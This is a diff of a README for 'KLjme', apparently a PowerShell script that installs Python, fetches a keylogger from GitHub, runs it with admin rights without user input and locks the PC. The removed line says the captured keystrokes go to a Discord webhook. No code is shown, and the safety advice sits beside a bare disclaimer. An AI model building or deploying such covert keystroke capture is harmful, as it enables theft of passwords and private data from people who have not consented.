@@ -1,1 +1,38 @@
-KLjme is a Keylogger script that downloads and installs python, downloads keylogger from github, then runs the keylogger and sends it to discord webhook
+KLjme
+
+KLjme is a PowerShell script designed to automate the installation of Python and a keylogger tool from a GitHub repository. The script installs Python, clones the KLjme repository, installs the required dependencies, and runs the keylogger.
+
+Usage
+
+To use KLjme, simply execute the script, and it will handle the rest. No user input is required.
+
+Important Notes
+
+	•	Ensure that PowerShell execution policy allows running scripts. You may need to set it to RemoteSigned or Unrestricted.
+	•	Use KLjme responsibly and only on systems where you have explicit permission to install software and conduct monitoring activities.
+	•	Be aware of legal and ethical considerations regarding the use of keyloggers and monitoring software.
+
+Disclaimer
+
+This script is provided for educational and research purposes only. The author assumes no liability for any misuse or damage caused by the script. Use it at your own risk.
+
+License
+
+This script is licensed under the MIT License. See the LICENSE file for details.
+
+Documentation
+
+Script Functionality
+
+	1.	PowerShell as Admin: Opens PowerShell with administrator privileges.
+	2.	Install Python: Downloads and installs Python 3.11.0 from the official Python website.
+	3.	Download and Install KLjme: Clones the KLjme repository from GitHub and installs the required dependencies using pip.
+	4.	Run Keylogger: Executes the keylogger script after installation.
+	5.	Lock PC: Locks the PC after keylogger execution to prevent unauthorized access.
+
+Troubleshooting
+
+	•	If the script fails to execute, ensure PowerShell execution policy allows running scripts.
+	•	Check network connectivity for downloading Python and the KLjme repository.
+
+For any further assistance or inquiries, please contact the script author.
